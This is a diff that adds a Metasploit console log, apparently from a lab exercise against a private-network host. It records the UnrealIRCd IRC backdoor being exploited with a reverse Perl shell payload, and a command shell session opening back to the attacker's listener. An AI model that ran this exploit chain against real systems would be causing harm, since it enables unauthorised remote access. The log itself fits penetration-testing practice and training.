@@ -1,0 +1,19 @@
+[*] Using configured payload cmd/linux/http/x86/meterpreter/reverse_tcp
+RHOSTS => 192.168.128.4
+RPORT => 6667
+PAYLOAD => cmd/unix/reverse_perl
+LHOST => 192.168.128.2
+LPORT => 4444
+[!] Unknown datastore option: ExitOnSession.
+ExitOnSession => true
+[*] Started reverse TCP handler on 192.168.128.2:4444 
+[*] 192.168.128.4:6667 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.128.4:6667 - Connected to 192.168.128.4:6667
+[*] 192.168.128.4:6667 - Trying to register a new IRC user: alden
+[+] 192.168.128.4:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
+[*] 192.168.128.4:6667 - Connected to 192.168.128.4:6667
+[*] 192.168.128.4:6667 - Sending IRC backdoor command
+[*] Command shell session 1 opened (192.168.128.2:4444 -> 192.168.128.4:50090) at 2026-11-08 16:09:18 -0500
+[*] Session 1 created in the background.
+[-] Session #1 is not a Meterpreter shell. Skipping...
+[-] Session #1 is not a Meterpreter shell. Skipping...
